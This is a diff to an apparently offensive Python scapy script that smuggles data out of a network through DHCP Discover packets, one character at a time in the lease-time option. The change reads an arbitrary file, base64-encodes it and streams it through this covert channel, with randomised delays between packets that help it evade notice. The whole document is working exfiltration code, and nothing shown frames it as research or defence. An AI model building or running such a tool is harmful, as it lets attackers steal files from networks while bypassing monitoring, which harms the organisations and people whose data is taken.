@@ -6,6 +6,7 @@ from scapy.sendrecv import sendp
 from scapy.arch import get_if_hwaddr
 import random
 import string
+import base64
 import os
 import time
 
@@ -92,14 +93,30 @@ def send_text(message: str, interface, mac) -> None:
     send_dhcp_discover(0, interface, src_mac=mac)
 
 def send_file(local_filename: str, interface: str, mac) -> None:
-    content = ""
-    with open(local_filename) as file:
-        content = file.read()
-    send_dhcp_discover(1, interface, mac)
-    for char in content:
-        send_dhcp_discover(ord(char), interface, src_mac=mac)
-        time.sleep(random.randint(1,100)*DELAY_FACTOR)
-    send_dhcp_discover(1, interface, mac)
+    """Read a file as binary, base64-encode it, and send the ASCII
+    base64 payload one character at a time using DHCP Discover (option 51).
+
+    Using base64 ensures arbitrary binary files can be transported since
+    the covert channel sends lease_time values as single-byte integers.
+    """
+    # Read file in binary mode
+    with open(local_filename, "rb") as file:
+        raw = file.read()
+
+    # Base64-encode -> bytes, then decode to ASCII string
+    b64 = base64.b64encode(raw).decode("ascii")
+
+    # Signal file transfer start (message-type marker 1)
+    send_dhcp_discover(1, interface, src_mac=mac)
+
+    # Send each base64 character as its ordinal value
+    for ch in b64:
+        send_dhcp_discover(ord(ch), interface, src_mac=mac)
+        # keep delay behavior consistent with send_text (ms scaling)
+        time.sleep(random.randint(1, 100) * DELAY_FACTOR * 0.001)
+
+    # Signal end of file transfer (same marker used as terminator)
+    send_dhcp_discover(1, interface, src_mac=mac)
 
 if __name__ == "__main__":
     if os.geteuid() != 0:
